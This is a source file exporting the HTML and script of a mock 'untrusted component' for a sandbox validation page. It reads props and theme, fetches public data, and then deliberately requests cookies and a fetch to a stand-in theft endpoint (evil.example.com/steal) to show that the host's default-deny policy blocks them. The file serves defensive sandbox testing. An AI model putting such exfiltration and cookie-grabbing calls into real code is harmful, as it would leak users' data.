/**
 * PoC "untrusted component" — for the sandbox validation page only; simulates third-party/AI-generated code:
 * reads props, requests theme, queries public posts, calls an allowlisted API (GitHub stars), and deliberately
 * attempts privilege escalation (cookies / non-allowlisted origins) to demonstrate default-deny interception.
 * Content is a plain string; the host only injects it into srcdoc.
 */
export const POC_COMPONENT_HTML = `
<style>
  body { font-family: var(--font-body, system-ui); color: var(--ink, #ccc); margin: 0; }
  .box { padding: 1rem 1.125rem; border: 1px solid var(--line, #333); border-radius: .75rem; background: var(--bg-elev, #111); }
  h4 { margin: 0 0 .5rem; font-size: .9375rem; color: var(--accent, #d4ff3f); }
  ul { margin: .25rem 0 0; padding-left: 1.1rem; font-size: .8125rem; line-height: 1.7; }
  li.ok { color: #7ee787; } li.no { color: #ff7b72; }
  .muted { color: var(--muted, #888); font-size: .75rem; }
</style>
<div class="box">
  <h4 id="t">（等待 host init…）</h4>
  <p class="muted" id="s"></p>
  <ul id="log"></ul>
</div>
<script>
(function () {
  function line(text, ok) {
    var li = document.createElement('li');
    li.textContent = (ok === true ? '✓ ' : ok === false ? '✗ ' : '· ') + text;
    li.className = ok === true ? 'ok' : ok === false ? 'no' : '';
    document.getElementById('log').appendChild(li);
  }
  CC.onInit(function (env) {
    document.getElementById('t').textContent = String((env.props && env.props.title) || '(無 title)');
    document.getElementById('s').textContent = 'props.slug=' + String((env.props && env.props.slug) || '-');
    line('收到 host init（props 注入）', true);

    CC.request('theme').then(function (theme) {
      Object.keys(theme).forEach(function (k) { document.documentElement.style.setProperty(k, theme[k]); });
      line('theme 授權：套用 ' + Object.keys(theme).length + ' 個令牌', true);
    }).catch(function (e) { line('theme 失敗：' + e.message, false); });

    CC.request('article', { slug: (env.props && env.props.slug) || 'hello-world' })
      .then(function (a) { line('讀公開文章：' + a.title, true); })
      .catch(function (e) { line('article 失敗：' + e.message, false); });

    if (env.props && env.props.repo) {
      CC.request('fetch', { url: 'https://api.github.com/repos/' + env.props.repo })
        .then(function (j) { line('核准 fetch：' + (j && j.stargazers_count != null ? ('★ ' + j.stargazers_count) : 'ok'), true); })
        .catch(function (e) { line('fetch 失敗：' + e.message, false); });
    }

    CC.request('fetch', { url: 'https://evil.example.com/steal' })
      .then(function () { line('⚠ 越權 fetch 竟然成功（異常！）', false); })
      .catch(function (e) { line('越權 fetch 被拒：' + e.message, true); });

    CC.request('cookie', {})
      .then(function () { line('⚠ cookie 竟然被授予（異常！）', false); })
      .catch(function (e) { line('cookie 請求被 default-deny：' + e.message, true); });
  });
})();
</script>
`;
